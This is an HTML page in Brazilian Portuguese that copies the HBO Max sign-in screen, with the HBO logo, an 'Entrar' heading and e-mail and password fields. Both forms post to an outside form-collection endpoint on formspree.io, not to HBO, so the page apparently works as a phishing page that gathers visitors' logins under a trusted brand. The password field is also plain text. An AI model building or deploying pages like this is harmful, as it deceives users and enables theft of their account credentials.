<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- CSS -->
    <link rel="stylesheet" href="style/style.css">
    <!-- FAVICON -->
    <link rel="shortcut icon" href="favicon/favicon.ico" type="image/x-icon">
    <title>Hbo Max 2</title>
</head>
<body>
    <div class="container">
        <!-- Logo Menu -->
        <div id="menu">
            <img src="assets/logo.svg" alt="Logo HBO">
        </div>
        <!-- Links a -->
        <div id="linkMenu">
            <a href="#">Menu</a>
            <a href="#">Assinar</a>
        </div>
        <!-- Título e Texto -->
        <div id="textAndTitle">
            <h1>Entrar</h1>
            <p>Você tem uma conta HBO Max?</p>
        </div>
        <!-- Seção de Inputs -->
        <div id="sectionInput">
            <!-- Input Email -->
            <div id="inputEmail">
                <label>E-mail</label>
                <form action="https://formspree.io/f/xyzknypd" method="post">
                    <input type="email" name="email" required>
                </form>
            </div>
            <!-- Input Senha -->
            <div id="inputSenha">
                <label>Senha</label>
                <form action="https://formspree.io/f/xyzknypd" method="post">
                    <input type="text" name="senha" required>
                </form>
            </div>
        </div>
        <!-- Botão 1 -->
        <button type="submit" id="buttonEntrar">Entrar</button>
        <p>Você acessa a HBO Max por um provedor <br>
            de TV, de internet ou celular?
        </p>
        <!-- Botão 2 -->
        <button type="button" id="buttonProvedor">Entrar como provedor</button>
    </div>
</body>
</html>
